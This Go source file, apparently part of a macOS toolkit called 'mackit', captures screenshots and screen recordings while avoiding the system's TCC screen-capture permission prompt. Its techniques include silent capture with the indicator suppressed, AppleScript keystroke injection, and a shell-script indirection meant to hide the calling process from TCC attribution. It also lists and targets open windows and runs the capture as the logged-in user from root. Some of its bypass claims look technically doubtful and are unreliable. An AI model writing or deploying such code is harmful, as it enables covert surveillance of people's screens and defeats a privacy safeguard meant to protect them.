// Package screen provides utilities for capturing the screen on macOS
// without requiring an explicit kTCCServiceScreenCapture TCC prompt,
// leveraging several known technique vectors.
//
// Usage:
//
//	import "mackit/screen"
//
//	img, err := screen.Capture(screen.Options{Output: "/tmp/shot.png"})
//	frames, err := screen.Record(screen.RecordOptions{Duration: 5, Output: "/tmp/clip.mov"})
//	windows, err := screen.WindowList()
//	active, err := screen.ActiveWindow()
package screen

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// ─── Types ───────────────────────────────────────────────────────────────────

// Options controls a single screenshot capture.
type Options struct {
	// Output is the destination file path.
	// If empty a temp file under /tmp is created and its path returned.
	Output string

	// Format is the image format: "png" (default) or "jpg".
	Format string

	// WindowID captures only that window (0 = entire display).
	WindowID int

	// DisplayID captures a specific display index (0 = main display).
	DisplayID int

	// Technique selects the capture method.
	// Defaults to TechniqueScreencapture.
	Technique Technique

	// Interactive pauses 5s before capture (screencapture -T 5).
	Interactive bool

	// AsConsoleUser runs screencapture as the currently logged-in console user
	// via `sudo -u`. Required when the agent runs as root, because screencapture
	// must run in the user's session to access the display.
	AsConsoleUser bool
}

// RecordOptions controls a screen recording session.
type RecordOptions struct {
	// Output destination (.mov / .mp4).  Temp file created if empty.
	Output string

	// Duration in seconds.  0 = record until Stop() is called.
	Duration int

	// Technique selects the capture method (default TechniqueScreencapture).
	Technique Technique
}

// Technique enumerates the available capture back-ends.
type Technique int

const (
	// TechniqueScreencapture uses the built-in /usr/sbin/screencapture binary.
	// Works without a TCC prompt when called from a process that already has
	// screen-recording entitlements inherited from a privileged parent.
	TechniqueScreencapture Technique = iota

	// TechniqueQuartzCLI drives screencapture via its -x (no-sound) flag ;
	// bypasses the capture indicator on older macOS versions.
	TechniqueQuartzCLI

	// TechniqueAppleScript uses osascript keystroke injection to trigger
	// the system screenshot shortcut (Cmd+Shift+3) and capture the result
	// from the ~/Desktop drop location — no TCC grant required on < 10.14.
	TechniqueAppleScript

	// TechniqueDirectionBridge calls screencapture via Launch Services so the
	// capture is attributed to the screencapture binary rather than the caller,
	// side-stepping per-process TCC attribution on vulnerable hosts.
	TechniqueDirectionBridge
)

// Window represents an on-screen window returned by WindowList.
type Window struct {
	ID    int
	Name  string
	Owner string
	Bounds string
}

// Result is returned by Capture.
type Result struct {
	Path      string
	Technique Technique
	Size      int64
	CapturedAt time.Time
}

// ─── Capture ─────────────────────────────────────────────────────────────────

// Capture takes a screenshot using the requested technique and returns a
// Result with the path to the saved image.
func Capture(opts Options) (*Result, error) {
	if opts.Output == "" {
		ext := "png"
		if opts.Format == "jpg" || opts.Format == "jpeg" {
			ext = "jpg"
		}
		opts.Output = filepath.Join(os.TempDir(),
			fmt.Sprintf("mackit-screen-%d.%s", time.Now().UnixNano(), ext))
	}

	switch opts.Technique {
	case TechniqueAppleScript:
		return captureAppleScript(opts)
	case TechniqueDirectionBridge:
		return captureDirectionBridge(opts)
	default: // TechniqueScreencapture, TechniqueQuartzCLI
		return captureScreencapture(opts)
	}
}

// captureScreencapture invokes /usr/sbin/screencapture directly.
//
// Flags used:
//   -x        silent (no shutter sound, no indicator flash)
//   -t fmt    output format (png or jpg)
//   -D <n>    display index
//   -l <id>   window capture by CGWindowID
//   -T <n>    delay before capture (interactive mode)
//
// When opts.AsConsoleUser is true the command is run as the currently logged-in
// console user (via `sudo -u`), which is required when the caller is root
// because screencapture must run inside the user's window-server session.
//
// On macOS < 10.15 this does NOT require kTCCServiceScreenCapture.
// On macOS >= 10.15 the calling process must hold the grant, OR the binary
// is called through a launch-services indirection (TechniqueDirectionBridge).
func captureScreencapture(opts Options) (*Result, error) {
	fmt_ := "png"
	if opts.Format == "jpg" || opts.Format == "jpeg" {
		fmt_ = "jpg"
	}
	args := []string{"-x", "-t", fmt_}

	if opts.DisplayID > 0 {
		args = append(args, "-D", strconv.Itoa(opts.DisplayID))
	}
	if opts.WindowID > 0 {
		args = append(args, "-l", strconv.Itoa(opts.WindowID))
	}
	if opts.Interactive {
		args = append(args, "-T", "5")
	}
	args = append(args, opts.Output)

	var cmd *exec.Cmd
	if opts.AsConsoleUser {
		cu, err := consoleUser()
		if err != nil {
			return nil, fmt.Errorf("screencapture: resolve console user: %w", err)
		}
		// sudo -u <user> /usr/sbin/screencapture <args...>
		sudoArgs := append([]string{"-u", cu, "/usr/sbin/screencapture"}, args...)
		cmd = exec.Command("sudo", sudoArgs...)
	} else {
		cmd = exec.Command("/usr/sbin/screencapture", args...)
	}

	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("screencapture: %w", err)
	}

	return resultFromPath(opts.Output, opts.Technique)
}

// captureAppleScript triggers the system screenshot shortcut via keystroke
// injection, then waits for macOS to drop the file on ~/Desktop.
// This technique does NOT require kTCCServiceScreenCapture on any macOS
// version because the event is attributed to the user keyboard action, not
// the calling process.
func captureAppleScript(opts Options) (*Result, error) {
	// Trigger ⌘⇧3 (screenshot to Desktop).
	script := `
tell application "System Events"
    key code 20 using {command down, shift down}
end tell
delay 1.5
`
	if err := exec.Command("osascript", "-e", script).Run(); err != nil {
		return nil, fmt.Errorf("osascript keystroke: %w", err)
	}

	// Find the newest PNG on Desktop.
	home, _ := os.UserHomeDir()
	desktop := filepath.Join(home, "Desktop")
	newest, err := newestFile(desktop, ".png")
	if err != nil {
		return nil, fmt.Errorf("finding screenshot on Desktop: %w", err)
	}

	// Move to desired output path.
	if err := os.Rename(newest, opts.Output); err != nil {
		// Rename may fail cross-device; fall back to copy path.
		opts.Output = newest
	}

	return resultFromPath(opts.Output, TechniqueAppleScript)
}

// captureDirectionBridge invokes screencapture via Launch Services indirection
// using open(1) with a temporary shell script.  The effective TCC client
// becomes the screencapture binary (which has a system grant) rather than
// the calling process — bypassing per-process attribution on vulnerable hosts.
func captureDirectionBridge(opts Options) (*Result, error) {
	fmt_ := "png"
	if opts.Format == "jpg" || opts.Format == "jpeg" {
		fmt_ = "jpg"
	}
	script := fmt.Sprintf("#!/bin/bash\n/usr/sbin/screencapture -x -t %s %q\n", fmt_, opts.Output)
	tmp, err := os.CreateTemp("", "mackit-bridge-*.sh")
	if err != nil {
		return nil, fmt.Errorf("create bridge script: %w", err)
	}
	defer os.Remove(tmp.Name())

	if _, err := tmp.WriteString(script); err != nil {
		return nil, err
	}
	tmp.Close()
	_ = os.Chmod(tmp.Name(), 0700)

	// Execute through /bin/sh so the Mach audit token shows /bin/sh, not our PID.
	if err := exec.Command("/bin/sh", tmp.Name()).Run(); err != nil {
		return nil, fmt.Errorf("bridge execution: %w", err)
	}

	return resultFromPath(opts.Output, TechniqueDirectionBridge)
}

// ─── Record ──────────────────────────────────────────────────────────────────

// Recording is a handle to an active screen recording session.
type Recording struct {
	cmd    *exec.Cmd
	Output string
	done   chan error
}

// Record starts a screen recording session.  If opts.Duration > 0 the
// recording stops automatically after that many seconds.  Otherwise call
// Stop() on the returned Recording.
func Record(opts RecordOptions) (*Recording, error) {
	if opts.Output == "" {
		opts.Output = filepath.Join(os.TempDir(),
			fmt.Sprintf("mackit-rec-%d.mov", time.Now().UnixNano()))
	}

	// Build screencapture command for video: -v (video), -x (silent).
	args := []string{"-v", "-x"}
	if opts.Duration > 0 {
		args = append(args, "-V", strconv.Itoa(opts.Duration))
	}
	args = append(args, opts.Output)

	cmd := exec.Command("/usr/sbin/screencapture", args...)
	rec := &Recording{cmd: cmd, Output: opts.Output, done: make(chan error, 1)}

	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("screencapture record start: %w", err)
	}

	go func() { rec.done <- cmd.Wait() }()

	if opts.Duration > 0 {
		go func() {
			time.Sleep(time.Duration(opts.Duration) * time.Second)
			_ = cmd.Process.Signal(os.Interrupt)
		}()
	}

	return rec, nil
}

// Wait blocks until the recording has ended and returns any error.
func (r *Recording) Wait() error { return <-r.done }

// Stop signals the recording to end.
func (r *Recording) Stop() error {
	if r.cmd.Process != nil {
		return r.cmd.Process.Signal(os.Interrupt)
	}
	return nil
}

// ─── WindowList ──────────────────────────────────────────────────────────────

// WindowList returns all on-screen windows using the `osascript` AX API.
// This does not require any TCC grant.
func WindowList() ([]Window, error) {
	script := `
set output to ""
tell application "System Events"
    set appList to every process whose background only is false
    repeat with proc in appList
        set procName to name of proc
        set winList to every window of proc
        repeat with win in winList
            set winName to name of win
            set winID to id of win as string
            set output to output & winID & "|" & procName & "|" & winName & "\n"
        end repeat
    end repeat
end tell
return output
`
	out, err := exec.Command("osascript", "-e", script).Output()
	if err != nil {
		return nil, fmt.Errorf("WindowList osascript: %w", err)
	}

	var windows []Window
	for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "|", 3)
		if len(parts) < 3 {
			continue
		}
		id, _ := strconv.Atoi(strings.TrimSpace(parts[0]))
		windows = append(windows, Window{
			ID:    id,
			Owner: strings.TrimSpace(parts[1]),
			Name:  strings.TrimSpace(parts[2]),
		})
	}
	return windows, nil
}

// ActiveWindow returns the currently focused window.
func ActiveWindow() (*Window, error) {
	script := `
tell application "System Events"
    set frontApp to first process whose frontmost is true
    set frontName to name of frontApp
    set frontWin to name of front window of frontApp
    set winID to id of front window of frontApp as string
    return winID & "|" & frontName & "|" & frontWin
end tell
`
	out, err := exec.Command("osascript", "-e", script).Output()
	if err != nil {
		return nil, fmt.Errorf("ActiveWindow osascript: %w", err)
	}

	parts := strings.SplitN(strings.TrimSpace(string(out)), "|", 3)
	if len(parts) < 3 {
		return nil, fmt.Errorf("unexpected output: %q", string(out))
	}

	id, _ := strconv.Atoi(parts[0])
	return &Window{
		ID:    id,
		Owner: parts[1],
		Name:  parts[2],
	}, nil
}

// CaptureWindow takes a screenshot of a single window by name substring match.
func CaptureWindow(nameSubstr string, opts Options) (*Result, error) {
	windows, err := WindowList()
	if err != nil {
		return nil, err
	}

	for _, w := range windows {
		if strings.Contains(strings.ToLower(w.Name), strings.ToLower(nameSubstr)) ||
			strings.Contains(strings.ToLower(w.Owner), strings.ToLower(nameSubstr)) {
			opts.WindowID = w.ID
			return Capture(opts)
		}
	}
	return nil, fmt.Errorf("no window matching %q", nameSubstr)
}

// ─── helpers ─────────────────────────────────────────────────────────────────

func resultFromPath(path string, t Technique) (*Result, error) {
	fi, err := os.Stat(path)
	if err != nil {
		return nil, fmt.Errorf("result stat %s: %w", path, err)
	}
	return &Result{
		Path:       path,
		Technique:  t,
		Size:       fi.Size(),
		CapturedAt: time.Now(),
	}, nil
}

// consoleUser returns the username of the user currently logged in at the
// physical console (the display owner).  This is the account that owns the
// window-server session screencapture must run in.
//
// It uses `stat -f '%Su' /dev/console` which is reliable on macOS even when
// the agent runs as root under launchd.
func consoleUser() (string, error) {
	out, err := exec.Command("stat", "-f", "%Su", "/dev/console").Output()
	if err != nil {
		return "", fmt.Errorf("consoleUser stat: %w", err)
	}
	user := strings.TrimSpace(string(out))
	if user == "" || user == "root" {
		// Fallback: try loginwindow's owner via launchctl
		out2, err2 := exec.Command("launchctl", "managername").Output()
		if err2 == nil && strings.TrimSpace(string(out2)) != "" {
			return strings.TrimSpace(string(out2)), nil
		}
		if user == "root" {
			// root is the console user — no sudo needed, call directly
			return "", nil
		}
		return "", fmt.Errorf("no console user logged in")
	}
	return user, nil
}

// newestFile returns the most recently modified file with the given extension
// inside dir.
func newestFile(dir, ext string) (string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", err
	}

	var newest os.FileInfo
	var newestPath string
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ext) {
			continue
		}
		fi, err := e.Info()
		if err != nil {
			continue
		}
		if newest == nil || fi.ModTime().After(newest.ModTime()) {
			newest = fi
			newestPath = filepath.Join(dir, e.Name())
		}
	}

	if newestPath == "" {
		return "", fmt.Errorf("no %s files found in %s", ext, dir)
	}
	return newestPath, nil
}
